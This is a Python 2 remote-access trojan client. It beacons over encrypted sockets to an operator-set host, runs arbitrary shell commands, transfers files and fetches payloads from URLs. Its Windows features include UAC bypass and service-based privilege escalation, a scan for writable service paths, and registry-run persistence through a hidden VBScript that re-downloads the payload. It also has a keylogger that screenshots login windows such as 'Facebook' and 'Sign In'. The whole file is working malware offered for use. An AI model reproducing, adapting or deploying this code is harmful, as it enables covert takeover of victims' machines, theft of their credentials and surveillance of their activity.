#!/usr/bin/python

from Crypto.Cipher import AES
from threading import Timer
from threading import Thread
import subprocess, socket, base64, time, datetime, os, sys, urllib2

# only import img library if OS is Windows
if os.name == 'nt':
	try:
		import pythoncom, pyHook, Image, ImageGrab, win32api, win32gui, win32con
	except:
		print "Problem importing Windows libraries.\nKeylogger and Screenshot won't work.\n"

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# server config
HOST = 'Your.IP.Address.Here'
PORT = 443

# session controller
active = False

# Functions
###########

# send data function
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
	
# receive data function
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]

# prompt function
def Prompt(sock, promptmsg):
	Send(sock, promptmsg)
	answer = Receive(sock)
	return answer

# upload file
def Upload(sock, filename):
	bgtr = True
	# file transfer
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			# begin sending file
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	# let server know we're done..
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
	
# download file
def Download(sock, filename):
	# file transfer
	g = open(filename, 'wb')
	# download file
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	# let server know we're done..
	return "Finished upload."

# download from url (unencrypted)
def Downhttp(sock, url):
	# get filename from url
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	g = open(filename, 'wb')
	# download file
	u = urllib2.urlopen(url)
	g.write(u.read())
	g.close()
	# let server know we're done...
	return "Finished download."
	
# privilege escalation
def Privs(sock):

	# Windows/NT Methods
	if os.name == 'nt':
	
		# get initial info
		privinfo = '\nUsername:		   ' + Exec('echo %USERNAME%')
		privinfo += Exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"')
		# support for other languagues go here...
		# if you want to display above information, you must change "OS Name", "OS Version", "System Type"
		# to your language of coice... makes no sense trying to look in this script as would take too long.
		
		winversion = Exec('systeminfo')
		windowsnew = -1
		windowsold = -1
		
		# newer versions of windows go here
		windowsnew += winversion.find('Windows 7')
		windowsnew += winversion.find('Windows 8')
		windowsnew += winversion.find('Windows Vista')
		windowsnew += winversion.find('Windows VistaT')
		windowsnew += winversion.find('Windows Server 2008')
		
		# older versions go here (only XP)
		windowsold += winversion.find('Windows XP')
		windowsold += winversion.find('Server 2003')
		
		# if it is, display privs using whoami command.
		if windowsnew > 0:
			privinfo += Exec('whoami /priv') + '\n'
		
		# check if user is administrator
		admincheck = Exec('net localgroup administrators | find "%USERNAME%"')
		
		# if user is in the administrator group, attempt service priv. esc. using bypassuac
		if admincheck != '':
		
			privinfo += 'Administrator privilege detected.\n\n'
		
			# if windows version is vista or greater, bypassUAC :)
			if windowsnew > 0:
				
				# prompt for bypassuac location or url
				bypassuac = Prompt(sock, privinfo+'Enter location/url for BypassUAC: ')
			
				# attempt to download from url
				if bypassuac.startswith("http") == True:
					try:
						c = Downhttp(sock, bypassuac)
						d = os.getcwd() + '\\' + bypassuac.split('/')[-1]
					except:
						return "Download failed: invalid url.\n"
			
				# attempt to open local file
				else:
					try:
						c = open(bypassuac)
						c.close()
						d = bypassuac
					except:
						return "Invalid location for BypassUAC.\n"

				
			# fetch executable's location
			curdir = os.path.join(sys.path[0], sys.argv[0])
			
			# add service
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
			if windowsold > 0: elvpri = Exec('sc create blah binPath= "' + curdir + '" type= own start= auto')
			# start service
			if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start blah')
			if windowsold > 0: elvpri = Exec('sc start blah')
			# finished.
			return "\nPrivilege escalation complete.\n"
		
		# windows xp doesnt allow wmic commands by defautlt ;(
		if windowsold > 0:
			privinfo += 'Unable to escalate privileges.\n'
			return privinfo

		# attempt to search for weak permissions on applications
		privinfo += 'Searching for weak permissions...\n\n'
		
		# array for possible matches
		permatch = []
		permatch.append("BUILTIN\Users:(I)(F)")
		permatch.append("BUILTIN\Users:(F)")
		
		permbool = False
		
		# stage 1 outputs to text file: p1.txt
		xv = Exec('for /f "tokens=2 delims=\'=\'" %a in (\'wmic service list full^|find /i "pathname"^|find /i /v "system32"\') do @echo %a >> p1.txt')
		# stage 2 outputs to text file: p2.txt
		xv = Exec('for /f eol^=^"^ delims^=^" %a in (p1.txt) do cmd.exe /c icacls "%a" >> p2.txt')
		
		# give some time to execute commands,
		# 40 sec should do it... ;)
		time.sleep(40)
		
		# loop from hell to determine a match to permatch array.
		ap = 0
		bp = 0
		dp = open('p2.txt')
		lines = dp.readlines()
		for line in lines:
			cp = 0
			while cp < len(permatch):
				j = line.find(permatch[cp])
				if j != -1:
					# we found a misconfigured directory :)
					if permbool == False:
						privinfo += 'The following directories have write access:\n\n'
						permbool = True
					bp = ap
					while True:
						if len(lines[bp].split('\\')) > 2:
							while bp <= ap:
								privinfo += lines[bp]
								bp += 1
							break
						else:
							bp -= 1
				cp += 1
			ap += 1
		time.sleep(4)
		if permbool == True: privinfo += '\nReplace executable with Python shell.\n'
		if permbool == False: privinfo += '\nNo directories with misconfigured premissions found.\n'
		# close file
		dp.close()
		# delete stages 1 & 2
		xv = Exec('del p1.txt')
		xv = Exec('del p2.txt')
		
		return privinfo
			
# persistence
def Persist(sock, redown=None, newdir=None):

	# Windows/NT Methods
	if os.name == 'nt':
		# checking for access to the registry... thanks to StackOverflow thread on that one! ;)
		privscheck = Exec('reg query "HKU\S-1-5-19" | find "error"')
		
		# if user isn't system, return
		if privscheck != '':
			return "You must be authority\system to enable persistence.\n"
		# otherwise procede
		else:
			# fetch executable's location
			exedir = os.path.join(sys.path[0], sys.argv[0])
			exeown = exedir.split('\\')[-1]
			
			# get vbscript location
			vbsdir = os.getcwd() + '\\' + 'vbscript.vbs'
			
			# write VBS script
			if redown == None: vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nWhile state = 1\nexist = ReportFileStatus(wshname)\nIf exist = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nElse\nWshShell.Run """' + exedir + '""",hidden\nwscript.sleep 50000\nEnd If\nvFound = False\nElse\nwscript.sleep 50000\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\n'
			else:
				if newdir == None: 
					newdir = exedir
					newexe = exeown
				else: 
					newexe = newdir.split('\\')[-1]
				vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nurlname = "' + redown + '"\ndirname = "' + newdir + '"\nWhile state = 1\nexist1 = ReportFileStatus(wshname)\nexist2 = ReportFileStatus(dirname)\nIf exist1 = False And exist2 = False then\ndownload urlname, dirname\nEnd If\nIf exist1 = True Or exist2 = True then\nif exist1 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nexist2 = False\nend if\nif exist2 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(dirname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nEnd If\nIf vFound = False then\nIf exist1 = True then\nWshShell.Run """' + exedir + '""",hidden\nEnd If\nIf exist2 = True then\nWshShell.Run """' + dirname + '""",hidden\nEnd If\nwscript.sleep 50000\nEnd If\nvFound = False\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\nfunction download(sFileURL, sLocation)\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\nobjXMLHTTP.open "GET", sFileURL, false\nobjXMLHTTP.send()\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject("ADODB.Stream")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = Createobject("Scripting.FileSystemObject")\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\nSet objFSO = Nothing\nobjADOStream.SaveToFile sLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nEnd function\n'
			
			# open file & write
			vbs = open('vbscript.vbs', 'wb')
			vbs.write(vbscript)
			vbs.close()
			
			# add registry to startup
			persist = Exec('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
			persist += '\nPersistence complete.\n'
			return persist
			
# execute command
def Exec(cmde):
	# check if command exists
	if cmde:
		execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		cmdoutput = execproc.stdout.read() + execproc.stderr.read()
		return cmdoutput
		
	# otherwise, return
	else:
		return "Enter a command.\n"

# keylogging function
# vs 1.0 originally by: KB Carte.
#################################
# only working for Windows.	#
LOG_SCREENSHOT = False		# set to True to take screenshot(s)
LOG_SCREENSNUM = 6			# set amount of screenshot to take.
LOG_INTERVAL = 1.6			# interval between each screenshot.
LOG_FILENAME = 'keylog.txt'	# log file (current directory)
LOG_ACTIVE = ''				#
LOG_SCREEN = []				# this list contains matches for taking automated screenshots...
#LOG_SCREEN.append("Facebook")	# for example, if it finds "Facebook" in titlebar..
#LOG_SCREEN.append("Sign In")	# or if it finds "Sign In", common email login page.
################################# you get the idea.. have fun! ;)
LOG_STATE = False
LOG_TIME = 20
LOG_TEXT = ""
main_thread_id = win32api.GetCurrentThreadId()
def Keylog(k, LOG_TIME, LOG_FILENAME):
	# only supported for Windows at the moment...
	if os.name != 'nt': return "Not supported for this operating system.\n"
	global LOG_TEXT, LOG_STATE, LOG_ACTIVE, main_thread_id
	LOG_STATE = True # begin logging!
	main_thread_id = win32api.GetCurrentThreadId()
	# add timestamp when it starts...
	LOG_TEXT += "\n===================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += ' ' + str(LOG_DATE) + ' >>> Logging started.. |\n'
	LOG_TEXT += "===================================================\n\n"
	# find out which window is currently active!
	w = win32gui
	LOG_ACTIVE = w.GetWindowText (w.GetForegroundWindow())
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += "[*] Window activated. [" + str(LOG_DATE) + "] \n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n"
	LOG_TEXT += " " + LOG_ACTIVE + " |\n"
	LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n\n"
	t = Timer(LOG_TIME, stopKeylog) # Quit
	t.start()
	# open file to write
	LOG_FILE = open(LOG_FILENAME, 'wb')
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages() # this is where all the magic happens! ;)
	# after finished, we add the timestamps at the end.
	LOG_TEXT += "\n\n===================================================\n"
	LOG_DATE = datetime.datetime.now()
	LOG_TEXT += " " + str(LOG_DATE) + ' >>> Logging finished. |\n'
	LOG_TEXT += "===================================================\n"
	LOG_STATE = False
	LOG_FILE.write(LOG_TEXT)
	LOG_FILE.close()
	#kg = 'Logged keystrokes to: ' + str(LOG_FILENAME) + ' for ' + str(LOG_TIME) + ' seconds...\n'
	#return True

# this function stops the keylogger...
# thank God for the StackOverflow thread! :D
def stopKeylog():
    win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);

# this function actually records the strokes.
def OnKeyboardEvent(event):
	global LOG_STATE
	# return is it isn't logging.
	if LOG_STATE == False: return True
	global LOG_TEXT, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
	# check for new window activation
	wg = win32gui
	LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
	if LOG_NEWACTIVE != LOG_ACTIVE:
		# record it down nicely...
		LOG_DATE = datetime.datetime.now()
		LOG_TEXT += "\n\n[*] Window activated. [" + str(LOG_DATE) + "] \n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n"
		LOG_TEXT += " " + LOG_NEWACTIVE + " |\n"
		LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n\n"
		LOG_ACTIVE = LOG_NEWACTIVE
		# take screenshots while logging!
		if LOG_SCREENSHOT == True:
			LOG_IMG = 0
			while LOG_IMG < len(LOG_SCREEN):
				if LOG_NEWACTIVE.find(LOG_SCREEN[LOG_IMG]) > 0:
					LOG_TEXT += "[*] Taking " + str(LOG_SCREENSNUM) + " screenshot for \"" + LOG_SCREEN[LOG_IMG] + "\" match.\n\n"
					ss = Thread(target=takeScreenshots, args=(LOG_SCREEN[LOG_IMG],LOG_SCREENSNUM,LOG_INTERVAL))
					ss.start()
				LOG_IMG += 1
			
	if event.Ascii == 8: LOG_TEXT = LOG_TEXT[:-1]
	elif event.Ascii == 13 or event.Ascii == 9: LOG_TEXT += "\n"
	else: LOG_TEXT += str(chr(event.Ascii))
	
	return True

# screenshot function
def Screenshot():
	img=ImageGrab.grab()
	saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
	img.save(saveas)
	imgout="Screenshot saved as: " + str(saveas) + "\n"
	return imgout

# take multiple screenshots function
# args = number of shots, interval between shots
def takeScreenshots(i, maxShots, intShots):
	shot = 0
	shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
	while shot < maxShots:
		Screenshot()
		time.sleep(intShots)
		shot += 1
	imgsout="Saved " + str(maxShots) + " screenshot(s) starting at: " + shottime + "\n"
	return imgsout

# main loop
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		  
		# create a cipher object using the random secret
		cipher = AES.new(secret,AES.MODE_CFB)

		# waiting to be activated...
		data = Receive(s)
	
		# activate.
		if data == 'Activate':
			active = True
			Send(s, "\n"+os.getcwd()+">")
		
		# interactive loop
		while active:
			
			# Receive data
			data = Receive(s)

			# think before you type smartass
			if data == '':
				time.sleep(0.02)
			
			# check for quit
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break
				
			# check for change directory
			elif data.startswith("cd ") == True:
				try:
					os.chdir(data[3:])
					stdoutput = ""
				except:
					stdoutput = "Error opening directory.\n"
				
			# check for download
			elif data.startswith("download") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])
			
			elif data.startswith("downhttp") == True:
				# Download from url
				stdoutput = Downhttp(s, data[9:])

			# check for upload
			elif data.startswith("upload") == True:
				# Download the file
				stdoutput = Download(s, data[7:])
				
			elif data.startswith("privs") == True:
				# Attempt to elevate privs
				stdoutput = Privs(s)
				
			elif data.startswith("persist") == True:
				# Attempt persistence
				if len(data.split(' ')) == 1: stdoutput = Persist(s)
				elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
				elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])
			
			elif data.startswith("keylog") == True:
				# Keylogging
				LOG_THREAD = "keylog"
				
				if len(data.split(' ')) == 1:
					LOG_FILENAME = str('keylog.txt')
					LOG_TIME = 20
				if len(data.split(' ')) == 2: 
					LOG_TIME = float(data.split(' ')[1])
				elif len(data.split(' ')) == 3: 
					LOG_TIME = float(data.split(' ')[1])
					LOG_FILENAME = str(data.split(' ')[2])
				
				kk = Thread(target=Keylog, args=(LOG_THREAD,LOG_TIME,LOG_FILENAME))
				kk.start()
				stdoutput = "Logging keystrokes to " + LOG_FILENAME + " for " + str(LOG_TIME) + "\n"#Keylog(LOG_THREAD, LOG_TIME, LOG_FILENAME)
			
			# take one screenshot
			elif data.startswith("screenshot") == True:
				# Screenshot
				stdoutput = Screenshot()
			
			# take any amount of screenshots
			elif data.startswith("multishots") == True:
				# Screenshots
				if len(data.split(' ')) != 3: stdoutput = "Error! Correct syntax: multishots [shots] [interval]\n\n[shots] = Amount of shots to take\n[interval] = Time between shots\n\n"
				else:
					shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
					zz = Thread(target=takeScreenshots, args=("Screenshots",int(data.split(' ')[1]),float(data.split(' ')[2])))
					zz.start()
					stdoutput = "Saved " + str(data.split(' ')[1]) + " screenshot(s) starting at: " + shottime + "\n"
			
			else:
				# execute command.
				stdoutput = Exec(data)

			# send data
			stdoutput = stdoutput+"\n"+os.getcwd()+">"
			Send(s, stdoutput)
			
		# loop ends here
		
		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue
	      
